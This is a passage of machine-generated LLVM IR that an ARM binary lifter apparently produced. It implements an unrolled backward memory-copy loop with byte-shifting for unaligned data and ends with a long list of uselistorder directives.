  %v0_176fc = load i32, i32* %r1.global-to-local, align 4
  %v1_176fc = add i32 %v0_176fc, -4
  %v2_176fc = inttoptr i32 %v1_176fc to i32*
  %v3_176fc = load i32, i32* %v2_176fc, align 4
  store i32 %v3_176fc, i32* @r3, align 4
  store i32 %v1_176fc, i32* %r1.global-to-local, align 4
  %v4_17700 = udiv i32 %v3_176fc, 16777216
  %v5_17700 = or i32 %v4_17700, %v3_176f8
  store i32 %v5_17700, i32* @ip, align 4
  %v2_17704 = add i32 %v1_17704, -4
  %v3_17704 = inttoptr i32 %v2_17704 to i32*
  store i32 %v5_17700, i32* %v3_17704, align 4
  %v4_17704 = load i32, i32* %r0.global-to-local, align 4
  %v5_17704 = add i32 %v4_17704, -4
  store i32 %v5_17704, i32* %r0.global-to-local, align 4
  %v0_17708 = load i32, i32* %r2.global-to-local, align 4
  %v2_17708 = add i32 %v0_17708, -4
  store i32 %v2_17708, i32* %r2.global-to-local, align 4
  %v6_1770c = icmp slt i32 %v0_17708, 4
  br i1 %v6_1770c, label %dec_label_pc_17710.loopexit, label %dec_label_pc_176f8

dec_label_pc_17710.loopexit:                      ; preds = %dec_label_pc_176f8
  %v4_17708 = sub i32 3, %v0_17708
  %v5_17708 = and i32 %v4_17708, %v0_17708
  %v6_17708 = icmp slt i32 %v5_17708, 0
  %v7_17708 = icmp slt i32 %v2_17708, 0
  store i1 %v6_17708, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17708, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17710

dec_label_pc_17710:                               ; preds = %dec_label_pc_17710.loopexit, %dec_label_pc_176ec
  %v2_1765451 = phi i32 [ %v5_17704, %dec_label_pc_17710.loopexit ], [ %v1_176e0, %dec_label_pc_176ec ]
  %v0_1764447 = phi i32 [ %v2_17708, %dec_label_pc_17710.loopexit ], [ %v2_176f0, %dec_label_pc_176ec ]
  %v0_17710 = load i32, i32* %r1.global-to-local, align 4
  %v1_17710 = add i32 %v0_17710, 3
  store i32 %v1_17710, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_17718:                               ; preds = %dec_label_pc_176a8
  br i1 %v5_17788, label %dec_label_pc_17764, label %dec_label_pc_17720

dec_label_pc_17720:                               ; preds = %dec_label_pc_17718
  store i32 %v2_17784, i32* %r2.global-to-local, align 4
  %v3_17724 = load i32, i32* @r4, align 4
  store i32 %v3_17724, i32* %stack_var_-12, align 4
  %v6_17724 = load i32, i32* @r5, align 4
  %v8_17724 = inttoptr i32 %v6_17724 to i8*
  store i8* %v8_17724, i8** %stack_var_-8, align 4
  %v11_17724 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17728

dec_label_pc_17728:                               ; preds = %dec_label_pc_17728.dec_label_pc_17728_crit_edge, %dec_label_pc_17720
  %v0_1774c = phi i32 [ %v1_1774c, %dec_label_pc_17728.dec_label_pc_17728_crit_edge ], [ %v0_176e019, %dec_label_pc_17720 ]
  %v0_1772c = phi i32 [ %v0_1772c.pre, %dec_label_pc_17728.dec_label_pc_17728_crit_edge ], [ %v1_17698, %dec_label_pc_17720 ]
  %v0_17728 = phi i32 [ %v0_17728.pre, %dec_label_pc_17728.dec_label_pc_17728_crit_edge ], [ %v2_1769c, %dec_label_pc_17720 ]
  %v3_17728 = mul i32 %v0_17728, 65536
  store i32 %v3_17728, i32* %lr.global-to-local, align 4
  %v1_1772c = add i32 %v0_1772c, -4
  %v2_1772c = inttoptr i32 %v1_1772c to i32*
  %v3_1772c = load i32, i32* %v2_1772c, align 4
  store i32 %v3_1772c, i32* @r3, align 4
  %v4_1772c = add i32 %v0_1772c, -8
  %v5_1772c = inttoptr i32 %v4_1772c to i32*
  %v6_1772c = load i32, i32* %v5_1772c, align 4
  store i32 %v6_1772c, i32* %r4.global-to-local, align 4
  %v7_1772c = add i32 %v0_1772c, -12
  %v8_1772c = inttoptr i32 %v7_1772c to i32*
  %v9_1772c = load i32, i32* %v8_1772c, align 4
  store i32 %v9_1772c, i32* %r5.global-to-local, align 4
  %v10_1772c = add i32 %v0_1772c, -16
  %v11_1772c = inttoptr i32 %v10_1772c to i32*
  %v12_1772c = load i32, i32* %v11_1772c, align 4
  store i32 %v10_1772c, i32* %r1.global-to-local, align 4
  %v4_17730 = udiv i32 %v12_1772c, 65536
  %v5_17730 = or i32 %v4_17730, %v3_17728
  store i32 %v5_17730, i32* %lr.global-to-local, align 4
  %v3_17734 = mul i32 %v12_1772c, 65536
  %v4_17738 = udiv i32 %v9_1772c, 65536
  %v5_17738 = or i32 %v3_17734, %v4_17738
  store i32 %v5_17738, i32* @ip, align 4
  %v3_1773c = mul i32 %v9_1772c, 65536
  %v4_17740 = udiv i32 %v6_1772c, 65536
  %v5_17740 = or i32 %v3_1773c, %v4_17740
  store i32 %v5_17740, i32* %r5.global-to-local, align 4
  %v3_17744 = mul i32 %v6_1772c, 65536
  %v4_17748 = udiv i32 %v3_1772c, 65536
  %v5_17748 = or i32 %v3_17744, %v4_17748
  store i32 %v5_17748, i32* %r4.global-to-local, align 4
  %v1_1774c = add i32 %v0_1774c, -16
  %v2_1774c = inttoptr i32 %v1_1774c to i32*
  store i32 %v5_17748, i32* %v2_1774c, align 4
  %v4_1774c = add i32 %v0_1774c, -12
  %v5_1774c = inttoptr i32 %v4_1774c to i32*
  %v6_1774c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1774c, i32* %v5_1774c, align 4
  %v7_1774c = add i32 %v0_1774c, -8
  %v8_1774c = inttoptr i32 %v7_1774c to i32*
  %v9_1774c = load i32, i32* @ip, align 4
  store i32 %v9_1774c, i32* %v8_1774c, align 4
  %v10_1774c = add i32 %v0_1774c, -4
  %v11_1774c = inttoptr i32 %v10_1774c to i32*
  %v12_1774c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1774c, i32* %v11_1774c, align 4
  store i32 %v1_1774c, i32* %r0.global-to-local, align 4
  %v0_17750 = load i32, i32* %r2.global-to-local, align 4
  %v2_17750 = add i32 %v0_17750, -16
  store i32 %v2_17750, i32* %r2.global-to-local, align 4
  %v6_17754 = icmp slt i32 %v0_17750, 16
  br i1 %v6_17754, label %dec_label_pc_17758, label %dec_label_pc_17728.dec_label_pc_17728_crit_edge

dec_label_pc_17728.dec_label_pc_17728_crit_edge:  ; preds = %dec_label_pc_17728
  %v0_17728.pre = load i32, i32* @r3, align 4
  %v0_1772c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17728

dec_label_pc_17758:                               ; preds = %dec_label_pc_17728
  %v2_17758 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17758, i32* @r4, align 4
  %v5_17758 = load i8*, i8** %stack_var_-8, align 4
  %v6_17758 = ptrtoint i8* %v5_17758 to i32
  store i32 %v6_17758, i32* @r5, align 4
  store i32 %v11_17724, i32* @lr, align 4
  %v2_1775c = add i32 %v0_17750, -4
  store i32 %v2_1775c, i32* %r2.global-to-local, align 4
  %v4_1775c = add i32 %v0_17750, 2147483632
  %v5_1775c = and i32 %v2_1775c, %v4_1775c
  %v6_1775c = icmp slt i32 %v5_1775c, 0
  store i1 %v6_1775c, i1* %cpsr_v.global-to-local, align 1
  %v7_1775c = icmp slt i32 %v2_1775c, 0
  store i1 %v7_1775c, i1* %cpsr_n.global-to-local, align 1
  %v8_1775c = icmp eq i32 %v2_1775c, 0
  store i1 %v8_1775c, i1* %cpsr_z.global-to-local, align 1
  %v5_17760 = icmp slt i32 %v2_17750, -12
  br i1 %v5_17760, label %dec_label_pc_1777c, label %dec_label_pc_17764

dec_label_pc_17764:                               ; preds = %dec_label_pc_17758, %dec_label_pc_17718, %dec_label_pc_17764
  %v1_17770 = phi i32 [ %v5_17770, %dec_label_pc_17764 ], [ %v1_1774c, %dec_label_pc_17758 ], [ %v0_176e019, %dec_label_pc_17718 ]
  %v0_17764 = load i32, i32* @r3, align 4
  %v3_17764 = mul i32 %v0_17764, 65536
  store i32 %v3_17764, i32* %ip.global-to-local, align 4
  %v0_17768 = load i32, i32* %r1.global-to-local, align 4
  %v1_17768 = add i32 %v0_17768, -4
  %v2_17768 = inttoptr i32 %v1_17768 to i32*
  %v3_17768 = load i32, i32* %v2_17768, align 4
  store i32 %v3_17768, i32* @r3, align 4
  store i32 %v1_17768, i32* %r1.global-to-local, align 4
  %v4_1776c = udiv i32 %v3_17768, 65536
  %v5_1776c = or i32 %v4_1776c, %v3_17764
  store i32 %v5_1776c, i32* @ip, align 4
  %v2_17770 = add i32 %v1_17770, -4
  %v3_17770 = inttoptr i32 %v2_17770 to i32*
  store i32 %v5_1776c, i32* %v3_17770, align 4
  %v4_17770 = load i32, i32* %r0.global-to-local, align 4
  %v5_17770 = add i32 %v4_17770, -4
  store i32 %v5_17770, i32* %r0.global-to-local, align 4
  %v0_17774 = load i32, i32* %r2.global-to-local, align 4
  %v2_17774 = add i32 %v0_17774, -4
  store i32 %v2_17774, i32* %r2.global-to-local, align 4
  %v6_17778 = icmp slt i32 %v0_17774, 4
  br i1 %v6_17778, label %dec_label_pc_1777c.loopexit, label %dec_label_pc_17764

dec_label_pc_1777c.loopexit:                      ; preds = %dec_label_pc_17764
  %v4_17774 = sub i32 3, %v0_17774
  %v5_17774 = and i32 %v4_17774, %v0_17774
  %v6_17774 = icmp slt i32 %v5_17774, 0
  %v7_17774 = icmp slt i32 %v2_17774, 0
  store i1 %v6_17774, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17774, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1777c

dec_label_pc_1777c:                               ; preds = %dec_label_pc_1777c.loopexit, %dec_label_pc_17758
  %v2_1765452 = phi i32 [ %v5_17770, %dec_label_pc_1777c.loopexit ], [ %v1_1774c, %dec_label_pc_17758 ]
  %v0_1764448 = phi i32 [ %v2_17774, %dec_label_pc_1777c.loopexit ], [ %v2_1775c, %dec_label_pc_17758 ]
  %v0_1777c = load i32, i32* %r1.global-to-local, align 4
  %v1_1777c = add i32 %v0_1777c, 2
  store i32 %v1_1777c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_17784:                               ; preds = %dec_label_pc_17698
  br i1 %v5_17788, label %dec_label_pc_177d0, label %dec_label_pc_1778c

dec_label_pc_1778c:                               ; preds = %dec_label_pc_17784
  store i32 %v2_17784, i32* %r2.global-to-local, align 4
  %v3_17790 = load i32, i32* @r4, align 4
  store i32 %v3_17790, i32* %stack_var_-12, align 4
  %v6_17790 = load i32, i32* @r5, align 4
  %v8_17790 = inttoptr i32 %v6_17790 to i8*
  store i8* %v8_17790, i8** %stack_var_-8, align 4
  %v11_17790 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17794

dec_label_pc_17794:                               ; preds = %dec_label_pc_17794.dec_label_pc_17794_crit_edge, %dec_label_pc_1778c
  %v0_177b8 = phi i32 [ %v1_177b8, %dec_label_pc_17794.dec_label_pc_17794_crit_edge ], [ %v0_176e019, %dec_label_pc_1778c ]
  %v0_17798 = phi i32 [ %v0_17798.pre, %dec_label_pc_17794.dec_label_pc_17794_crit_edge ], [ %v1_17698, %dec_label_pc_1778c ]
  %v0_17794 = phi i32 [ %v0_17794.pre, %dec_label_pc_17794.dec_label_pc_17794_crit_edge ], [ %v2_1769c, %dec_label_pc_1778c ]
  %v3_17794 = mul i32 %v0_17794, 16777216
  store i32 %v3_17794, i32* %lr.global-to-local, align 4
  %v1_17798 = add i32 %v0_17798, -4
  %v2_17798 = inttoptr i32 %v1_17798 to i32*
  %v3_17798 = load i32, i32* %v2_17798, align 4
  store i32 %v3_17798, i32* @r3, align 4
  %v4_17798 = add i32 %v0_17798, -8
  %v5_17798 = inttoptr i32 %v4_17798 to i32*
  %v6_17798 = load i32, i32* %v5_17798, align 4
  store i32 %v6_17798, i32* %r4.global-to-local, align 4
  %v7_17798 = add i32 %v0_17798, -12
  %v8_17798 = inttoptr i32 %v7_17798 to i32*
  %v9_17798 = load i32, i32* %v8_17798, align 4
  store i32 %v9_17798, i32* %r5.global-to-local, align 4
  %v10_17798 = add i32 %v0_17798, -16
  %v11_17798 = inttoptr i32 %v10_17798 to i32*
  %v12_17798 = load i32, i32* %v11_17798, align 4
  store i32 %v10_17798, i32* %r1.global-to-local, align 4
  %v4_1779c = udiv i32 %v12_17798, 256
  %v5_1779c = or i32 %v4_1779c, %v3_17794
  store i32 %v5_1779c, i32* %lr.global-to-local, align 4
  %v3_177a0 = mul i32 %v12_17798, 16777216
  %v4_177a4 = udiv i32 %v9_17798, 256
  %v5_177a4 = or i32 %v3_177a0, %v4_177a4
  store i32 %v5_177a4, i32* @ip, align 4
  %v3_177a8 = mul i32 %v9_17798, 16777216
  %v4_177ac = udiv i32 %v6_17798, 256
  %v5_177ac = or i32 %v3_177a8, %v4_177ac
  store i32 %v5_177ac, i32* %r5.global-to-local, align 4
  %v3_177b0 = mul i32 %v6_17798, 16777216
  %v4_177b4 = udiv i32 %v3_17798, 256
  %v5_177b4 = or i32 %v3_177b0, %v4_177b4
  store i32 %v5_177b4, i32* %r4.global-to-local, align 4
  %v1_177b8 = add i32 %v0_177b8, -16
  %v2_177b8 = inttoptr i32 %v1_177b8 to i32*
  store i32 %v5_177b4, i32* %v2_177b8, align 4
  %v4_177b8 = add i32 %v0_177b8, -12
  %v5_177b8 = inttoptr i32 %v4_177b8 to i32*
  %v6_177b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_177b8, i32* %v5_177b8, align 4
  %v7_177b8 = add i32 %v0_177b8, -8
  %v8_177b8 = inttoptr i32 %v7_177b8 to i32*
  %v9_177b8 = load i32, i32* @ip, align 4
  store i32 %v9_177b8, i32* %v8_177b8, align 4
  %v10_177b8 = add i32 %v0_177b8, -4
  %v11_177b8 = inttoptr i32 %v10_177b8 to i32*
  %v12_177b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_177b8, i32* %v11_177b8, align 4
  store i32 %v1_177b8, i32* %r0.global-to-local, align 4
  %v0_177bc = load i32, i32* %r2.global-to-local, align 4
  %v2_177bc = add i32 %v0_177bc, -16
  store i32 %v2_177bc, i32* %r2.global-to-local, align 4
  %v6_177c0 = icmp slt i32 %v0_177bc, 16
  br i1 %v6_177c0, label %dec_label_pc_177c4, label %dec_label_pc_17794.dec_label_pc_17794_crit_edge

dec_label_pc_17794.dec_label_pc_17794_crit_edge:  ; preds = %dec_label_pc_17794
  %v0_17794.pre = load i32, i32* @r3, align 4
  %v0_17798.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17794

dec_label_pc_177c4:                               ; preds = %dec_label_pc_17794
  %v2_177c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_177c4, i32* @r4, align 4
  %v5_177c4 = load i8*, i8** %stack_var_-8, align 4
  %v6_177c4 = ptrtoint i8* %v5_177c4 to i32
  store i32 %v6_177c4, i32* @r5, align 4
  store i32 %v11_17790, i32* @lr, align 4
  %v2_177c8 = add i32 %v0_177bc, -4
  store i32 %v2_177c8, i32* %r2.global-to-local, align 4
  %v4_177c8 = add i32 %v0_177bc, 2147483632
  %v5_177c8 = and i32 %v2_177c8, %v4_177c8
  %v6_177c8 = icmp slt i32 %v5_177c8, 0
  store i1 %v6_177c8, i1* %cpsr_v.global-to-local, align 1
  %v7_177c8 = icmp slt i32 %v2_177c8, 0
  store i1 %v7_177c8, i1* %cpsr_n.global-to-local, align 1
  %v8_177c8 = icmp eq i32 %v2_177c8, 0
  store i1 %v8_177c8, i1* %cpsr_z.global-to-local, align 1
  %v5_177cc = icmp slt i32 %v2_177bc, -12
  br i1 %v5_177cc, label %dec_label_pc_177e8, label %dec_label_pc_177d0

dec_label_pc_177d0:                               ; preds = %dec_label_pc_177c4, %dec_label_pc_17784, %dec_label_pc_177d0
  %v1_177dc = phi i32 [ %v5_177dc, %dec_label_pc_177d0 ], [ %v1_177b8, %dec_label_pc_177c4 ], [ %v0_176e019, %dec_label_pc_17784 ]
  %v0_177d0 = load i32, i32* @r3, align 4
  %v3_177d0 = mul i32 %v0_177d0, 16777216
  store i32 %v3_177d0, i32* %ip.global-to-local, align 4
  %v0_177d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_177d4 = add i32 %v0_177d4, -4
  %v2_177d4 = inttoptr i32 %v1_177d4 to i32*
  %v3_177d4 = load i32, i32* %v2_177d4, align 4
  store i32 %v3_177d4, i32* @r3, align 4
  store i32 %v1_177d4, i32* %r1.global-to-local, align 4
  %v4_177d8 = udiv i32 %v3_177d4, 256
  %v5_177d8 = or i32 %v4_177d8, %v3_177d0
  store i32 %v5_177d8, i32* @ip, align 4
  %v2_177dc = add i32 %v1_177dc, -4
  %v3_177dc = inttoptr i32 %v2_177dc to i32*
  store i32 %v5_177d8, i32* %v3_177dc, align 4
  %v4_177dc = load i32, i32* %r0.global-to-local, align 4
  %v5_177dc = add i32 %v4_177dc, -4
  store i32 %v5_177dc, i32* %r0.global-to-local, align 4
  %v0_177e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_177e0 = add i32 %v0_177e0, -4
  store i32 %v2_177e0, i32* %r2.global-to-local, align 4
  %v6_177e4 = icmp slt i32 %v0_177e0, 4
  br i1 %v6_177e4, label %dec_label_pc_177e8.loopexit, label %dec_label_pc_177d0

dec_label_pc_177e8.loopexit:                      ; preds = %dec_label_pc_177d0
  %v4_177e0 = sub i32 3, %v0_177e0
  %v5_177e0 = and i32 %v4_177e0, %v0_177e0
  %v6_177e0 = icmp slt i32 %v5_177e0, 0
  %v7_177e0 = icmp slt i32 %v2_177e0, 0
  store i1 %v6_177e0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_177e0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_177e8

dec_label_pc_177e8:                               ; preds = %dec_label_pc_177e8.loopexit, %dec_label_pc_177c4
  %v2_1765453 = phi i32 [ %v5_177dc, %dec_label_pc_177e8.loopexit ], [ %v1_177b8, %dec_label_pc_177c4 ]
  %v0_1764449 = phi i32 [ %v2_177e0, %dec_label_pc_177e8.loopexit ], [ %v2_177c8, %dec_label_pc_177c4 ]
  %v0_177e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_177e8 = add i32 %v0_177e8, 1
  store i32 %v1_177e8, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_177dc, { 0, 2, 1 }
  uselistorder i32 %v3_177d0, { 1, 0 }
  uselistorder i32 %v2_177c8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_177b8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17798, { 1, 0 }
  uselistorder i32 %v3_17794, { 1, 0 }
  uselistorder i32 %v0_17798, { 3, 2, 1, 0 }
  uselistorder i32 %v0_177b8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17770, { 0, 2, 1 }
  uselistorder i32 %v3_17764, { 1, 0 }
  uselistorder i32 %v2_1775c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1774c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1772c, { 1, 0 }
  uselistorder i32 %v3_17728, { 1, 0 }
  uselistorder i32 %v0_1772c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1774c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17704, { 0, 2, 1 }
  uselistorder i32 %v3_176f8, { 1, 0 }
  uselistorder i32 %v2_176f0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_176e0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_176c0, { 1, 0 }
  uselistorder i32 %v3_176bc, { 1, 0 }
  uselistorder i32 %v0_176c0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_176e0, { 3, 2, 1, 0 }
  uselistorder i1 %v5_17788, { 2, 0, 1 }
  uselistorder i32 %v0_176a0, { 1, 0 }
  uselistorder i32 %v0_1778c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_176e019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_17690, { 2, 1, 0 }
  uselistorder i32 %v0_17690, { 2, 0, 1 }
  uselistorder i32 %v2_17688, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_17688, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17688, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_176e020, { 2, 1, 0 }
  uselistorder i32 %v11_17664, { 1, 0 }
  uselistorder i32 %v7_17664, { 1, 0 }
  uselistorder i32 %v1_17644, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_17644, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17648, { 1, 0 }
  uselistorder i32 %v7_1763c, { 0, 2, 1 }
  uselistorder i32 %v10_17638, { 1, 0 }
  uselistorder i32 %v9_17630, { 1, 0, 2 }
  uselistorder i32 %v6_1762c, { 1, 0 }
  uselistorder i32 %v2_17624, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_17624, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_17634, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17618, { 0, 2, 1 }
  uselistorder i32 %v13_17614, { 1, 0 }
  uselistorder i32 %v4_17610, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_17610, { 2, 0, 1 }
  uselistorder i32 %v6_17618, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17608, { 0, 2, 1 }
  uselistorder i32 %v16_17604, { 1, 0 }
  uselistorder i32 %v4_17600, { 1, 2, 0 }
  uselistorder i32 %v0_17610.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_17608, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_175f4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_175f0, { 1, 0 }
  uselistorder i32 %v1_175ec, { 1, 0 }
  uselistorder i32 %v10_175e8, { 1, 0 }
  uselistorder i32 %v0_175e8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_175ec, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_175e0, { 0, 2, 1 }
  uselistorder i32 %v2_175d4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_175d4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_175ec37, { 1, 2, 0 }
  uselistorder i32 %v1_175cc, { 2, 1, 0 }
  uselistorder i32 %v1_175c4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_175bc, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_175b8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_175b4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_175b4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_175a4, { 0, 2, 1 }
  uselistorder i32 %v4_175a0, { 1, 0 }
  uselistorder i32 %v3_17594, { 1, 0 }
  uselistorder i32 %v1_1758c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17580, { 1, 0 }
  uselistorder i32 %v12_1757c, { 0, 2, 1 }
  uselistorder i32 %v8_1755c, { 1, 0, 2 }
  uselistorder i32 %v5_1755c, { 1, 0, 2 }
  uselistorder i32 %v2_1755c, { 1, 0, 2 }
  uselistorder i32 %v0_1755c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1757c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_17538, { 0, 2, 1 }
  uselistorder i32 %v4_17534, { 1, 0 }
  uselistorder i32 %v3_17528, { 1, 0 }
  uselistorder i32 %v1_17520, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17514, { 1, 0 }
  uselistorder i32 %v12_17510, { 0, 2, 1 }
  uselistorder i32 %v8_174f0, { 1, 0, 2 }
  uselistorder i32 %v5_174f0, { 1, 0, 2 }
  uselistorder i32 %v2_174f0, { 1, 0, 2 }
  uselistorder i32 %v0_174f0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17510, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_174cc, { 0, 2, 1 }
  uselistorder i32 %v4_174c8, { 1, 0 }
  uselistorder i32 %v3_174bc, { 1, 0 }
  uselistorder i32 %v1_174b4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_174a8, { 1, 0 }
  uselistorder i32 %v12_174a4, { 0, 2, 1 }
  uselistorder i32 %v8_17484, { 1, 0, 2 }
  uselistorder i32 %v5_17484, { 1, 0, 2 }
  uselistorder i32 %v2_17484, { 1, 0, 2 }
  uselistorder i32 %v0_17484, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_174a4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_174e0, { 0, 2, 1 }
  uselistorder i32 %v1_174dc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_17460, { 2, 0, 1, 3 }
  uselistorder i32 %v2_17460, { 2, 0, 1, 3 }
  uselistorder i32 %v0_174e4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1757c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_17454, { 1, 0 }
  uselistorder i32 %v0_17454, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1744c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1744c, { 1, 0, 2 }
  uselistorder i32 %v0_1744c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1757c77, { 1, 0 }
  uselistorder i32 %v1_1742c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_17434, { 1, 0 }
  uselistorder i32 %v0_17408, { 3, 0, 1, 2 }
  uselistorder i32 %v1_173fc, { 1, 2, 0, 3 }
  uselistorder i32 %v5_173e8, { 1, 0, 2 }
  uselistorder i32 %v1_173e4, { 1, 0 }
  uselistorder i32 %v1_173dc, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_173dc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_173d4, { 0, 2, 1 }
  uselistorder i32 %v3_173d4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_173d4, { 1, 0 }
  uselistorder i1 %v1_173d4, { 1, 0 }
  uselistorder i32 %v3_173d0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_173c8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_173b4, { 1, 2, 0 }
  uselistorder i32 %v1_173ac, { 0, 2, 1 }
  uselistorder i32 %v12_173a8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1739c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_173a0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_17390, { 0, 2, 1 }
  uselistorder i32 %v1_17388, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_17388, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_17380, { 1, 0 }
  uselistorder i32 %v1_17378, { 2, 1, 0 }
  uselistorder i32 %v2_17370, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_17370, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1736c, { 1, 0 }
  uselistorder i32 %v2_17360, { 1, 0 }
  uselistorder i32 %v1_17360, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_17360, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 0, 26, 2, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 0, 24, 2, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
